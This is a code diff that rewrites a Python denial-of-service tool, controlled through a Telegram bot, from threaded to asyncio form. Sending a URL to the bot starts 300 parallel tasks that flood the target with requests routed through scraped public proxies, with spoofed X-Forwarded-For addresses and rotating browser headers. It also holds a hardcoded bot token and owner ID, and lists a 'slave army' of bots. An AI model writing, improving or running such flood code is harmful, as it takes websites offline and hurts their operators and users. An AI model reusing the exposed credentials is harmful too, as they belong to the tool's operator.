@@ -1,5 +1,8 @@
-import os, time, requests, threading, random
-from http.server import HTTPServer, BaseHTTPRequestHandler
+import asyncio
+import aiohttp
+import random
+import time
+from aiohttp import web
 
 MASTER_TOKEN = "8536346083:AAGYUDR6cd7hI9_41_gNbQdREbBb6Dn_9v4"
 SLAVE_ARMY = {
@@ -16,91 +19,120 @@ SLAVE_ARMY = {
 }
 MASTER_ID = 1938591484
 
-class HealthCheck(BaseHTTPRequestHandler):
-    def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b"SYSTEM_V6_OPERATIONAL")
-
-class SovereignFinalMaster:
-    def __init__(self, m_token, s_army):
-        self.m_token, self.army = m_token, s_army
-        self.api_url = f"https://api.telegram.org/bot{m_token}"
+class SovereignUltimateCore:
+    def __init__(self):
+        self.m_token = MASTER_TOKEN
+        self.army = SLAVE_ARMY
+        self.targets = {}
         self.replied_flags = {}
-        self.active_targets = {}
-        self._notify(MASTER_ID, "🔱 **SYSTEM DEPLOYED: FINAL CORE ONLINE**\nমালিক, আপনার ১০ সদস্যের সেনাবাহিনী এখন আপনার অধীনে।")
+        self.active_tasks = []
+        self.session = None
 
-    def _notify(self, chat_id, text, token=None, markup=None):
-        url = f"https://api.telegram.org/bot{token if token else self.m_token}/sendMessage"
-        params = {'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}
-        if markup: params['reply_markup'] = markup
-        try: requests.post(url, json=params)
+    async def _notify(self, text, token=None, chat_id=MASTER_ID):
+        url = f"https://api.telegram.org/bot{token or self.m_token}/sendMessage"
+        try:
+            async with self.session.post(url, json={'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}, timeout=10) as r:
+                return await r.json()
         except: pass
 
-    def _get_panel(self):
-        return {
-            "inline_keyboard": [
-                [{"text": "📜 আর্মি লিস্ট ও স্ট্যাটাস", "callback_data": "list_army"}],
-                [{"text": "🛠️ রিকভারি স্লট", "callback_data": "recovery_info"}]
-            ]
-        }
+    async def _get_proxies(self):
+        try:
+            async with self.session.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000", timeout=10) as r:
+                return (await r.text()).splitlines() if r.status == 200 else []
+        except: return []
 
-    def _verify_alive(self, slot, token, name):
-        time.sleep(5)
+    async def _verify_alive(self, slot, token, name):
+        await asyncio.sleep(5)
         if not self.replied_flags.get(slot):
             try:
-                r = requests.get(f"https://api.telegram.org/bot{token}/getMe").json()
-                if not r.get("ok"): self._notify(MASTER_ID, f"💀 **ALERT:** {slot} ({name}) অফলাইন বা মৃত।")
-                else: self._notify(MASTER_ID, f"⚠️ **ALERT:** {slot} ({name}) রেসপন্স করেনি।")
+                async with self.session.get(f"https://api.telegram.org/bot{token}/getMe", timeout=10) as r:
+                    d = await r.json()
+                    m = f"💀 {slot} ({name}) অফলাইন!" if not d.get("ok") else f"⚠️ {slot} ({name}) ৫ সেকেন্ডে উত্তর দেয়নি!"
+                    await self._notify(m)
             except: pass
         self.replied_flags[slot] = False
 
-    def _attack(self, target):
-        while self.active_targets.get(target):
+    async def _strike_task(self, target, proxies):
+        while target in self.targets:
+            proxy = random.choice(proxies) if proxies else None
+            p_url = f"http://{proxy}" if proxy else None
+            h = {
+                'User-Agent': f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(115, 126)}.0.0.0 Safari/537.36",
+                'X-Forwarded-For': ".".join(map(str, (random.randint(1, 255) for _ in range(4)))),
+                'Accept': '*/*', 'Connection': 'keep-alive'
+            }
             try:
-                headers = {'User-Agent': random.choice(["Mozilla/5.0", "AppleWebKit/537.36"]), 'X-Forwarded-For': ".".join(map(str, (random.randint(1, 255) for _ in range(4))))}
-                requests.get(target, headers=headers, timeout=5)
+                async with self.session.get(target, headers=h, proxy=p_url, timeout=5) as r:
+                    self.targets[target] += 1
             except: pass
-            time.sleep(random.uniform(0.1, 0.4))
+            await asyncio.sleep(0.0001)
 
-    def listen(self):
+    async def handle_updates(self):
         offset = 0
         while True:
             try:
-                res = requests.get(f"{self.api_url}/getUpdates?offset={offset}&timeout=15").json()
-                for update in res.get('result', []):
-                    offset = update['update_id'] + 1
-                    if 'callback_query' in update:
-                        data = update['callback_query']['data']
-                        if data == "list_army":
-                            msg = f"📊 **টোটাল ইউনিট: {len(self.army)}**\n"
-                            for s, t in self.army.items():
-                                try:
-                                    r = requests.get(f"https://api.telegram.org/bot{t}/getMe").json()
-                                    msg += f"✅ {s}: @{r['result']['username']}\n" if r.get("ok") else f"❌ {s}: DEAD\n"
-                                except: msg += f"⚠️ {s}: Error\n"
-                            self._notify(MASTER_ID, msg)
-                        elif data == "recovery_info": self._notify(MASTER_ID, "📝 `/recovery S[No] [Token]`")
-                    elif 'message' in update:
-                        msg = update['message']
-                        text, uid = msg.get('text', ''), msg.get('from', {}).get('id')
+                url = f"https://api.telegram.org/bot{self.m_token}/getUpdates?offset={offset}&timeout=20"
+                async with self.session.get(url, timeout=25) as r:
+                    data = await r.json()
+                    if not data or not data.get('ok'):
+                        await asyncio.sleep(1)
+                        continue
+                    for update in data.get('result', []):
+                        offset = update['update_id'] + 1
+                        msg = update.get('message', {})
+                        text = msg.get('text', '')
+                        uid = msg.get('from', {}).get('id', 0)
                         if uid != MASTER_ID: continue
-                        if text == "Aip2k3052" or text == "/army": self._notify(uid, "🔱 **মাস্টার বোর্ড**", markup=self._get_panel())
-                        elif "http" in text:
-                            self.active_targets[text] = True
-                            self._notify(uid, "⚔️ **ATTACK INITIATED BY 10 UNITS!**")
-                            for _ in range(10): threading.Thread(target=self._attack, args=(text,), daemon=True).start()
-                        else:
-                            for slot, token in self.army.items():
+                        if text.startswith("http"):
+                            self.targets[text] = 0
+                            p_list = await self._get_proxies()
+                            await self._notify(f"⚔️ **SYSTEM STRIKE ACTIVATED**\nTarget: {text}\nNodes: {len(self.army)}\nParallel Tasks: 300")
+                            for _ in range(300):
+                                task = asyncio.create_task(self._strike_task(text, p_list))
+                                self.active_tasks.append(task)
+                        elif text == "/stop":
+                            self.targets.clear()
+                            for t in self.active_tasks:
+                                if not t.done(): t.cancel()
+                            self.active_tasks.clear()
+                            await self._notify("🛑 **SYSTEM HALTED & MEMORY CLEANED**")
+                        elif text in ["/army", "/start"]:
+                            rep = "📊 **ARMY LIVE STATUS REPORT:**\n"
+                            tasks = [self.session.get(f"https://api.telegram.org/bot{tk}/getMe", timeout=10) for tk in self.army.values()]
+                            resps = await asyncio.gather(*tasks, return_exceptions=True)
+                            for i, (s, tk) in enumerate(self.army.items()):
                                 try:
-                                    r = requests.get(f"https://api.telegram.org/bot{token}/getMe").json()
-                                    if r.get("ok") and f"@{r['result']['username']}" in text:
-                                        self.replied_flags[slot] = False
-                                        threading.Thread(target=self._verify_alive, args=(slot, token, r['result']['first_name'])).start()
-                                        self._notify(uid, "🤖 **হাজির মালিক!**", token=token)
-                                        self.replied_flags[slot] = True
+                                    rd = await resps[i].json()
+                                    rep += f"✅ {s}: @{rd['result']['username']}\n" if rd.get("ok") else f"❌ {s}: DEAD\n"
+                                except: rep += f"❌ {s}: ERROR\n"
+                            await self._notify(rep)
+                        else:
+                            for s, tk in self.army.items():
+                                try:
+                                    async with self.session.get(f"https://api.telegram.org/bot{tk}/getMe", timeout=5) as rb:
+                                        d = await rb.json()
+                                        if d.get("ok") and f"@{d['result']['username']}" in text:
+                                            self.replied_flags[s] = False
+                                            asyncio.create_task(self._verify_alive(s, tk, d['result']['first_name']))
+                                            await self._notify("🤖 **হাজির মালিক!**", token=tk)
+                                            self.replied_flags[s] = True
                                 except: pass
-            except: pass
-            time.sleep(1)
+            except: await asyncio.sleep(1)
+
+async def main():
+    core = SovereignUltimateCore()
+    conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
+    async with aiohttp.ClientSession(connector=conn) as sess:
+        core.session = sess
+        app = web.Application()
+        app.router.add_get('/', lambda r: web.Response(text="GOD_MODE_ONLINE_V6"))
+        runner = web.AppRunner(app)
+        await runner.setup()
+        site = web.TCPSite(runner, '0.0.0.0', 10000)
+        await asyncio.gather(site.start(), core.handle_updates())
 
 if __name__ == "__main__":
-    threading.Thread(target=lambda: HTTPServer(('0.0.0.0', 10000), HealthCheck).serve_forever(), daemon=True).start()
-    SovereignFinalMaster(MASTER_TOKEN, SLAVE_ARMY).listen()
-            
+    try: asyncio.run(main())
+    except (KeyboardInterrupt, SystemExit): pass
+    except: pass
+        
